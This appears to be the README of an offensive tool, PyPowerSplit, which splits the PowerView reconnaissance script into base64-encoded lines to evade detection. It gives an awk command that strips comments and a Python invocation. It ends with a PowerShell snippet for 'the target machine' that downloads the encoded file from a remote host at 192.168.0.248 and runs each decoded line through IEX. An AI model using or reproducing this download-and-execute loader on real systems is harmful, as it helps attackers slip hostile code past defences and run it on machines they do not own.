 
# How it works
The idea is to split the ps1 script into functions, base64 encode all functions and dump that into a file. Then load the file with powershell and loop through all the lines, base64 decode and IEX. Profit!

# Clean the powershell script
Remove all the comments and docs
```
awk '/<#/{flag=0;next}/#>/{flag=1}flag' PowerView.ps1 > pv.ps1
```

The python script takes care of removing the inline comments (starts with `#`)

# Run
```
python PyPowerSplit.py pv.ps1 > p
```

# Powershell (run.ps1)
To run the code, run this on the target machine. Change the address accordingly.
```
ForEach ($line in $((New-Object Net.WebClient).DownloadString('http://192.168.0.248:5555/p') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
```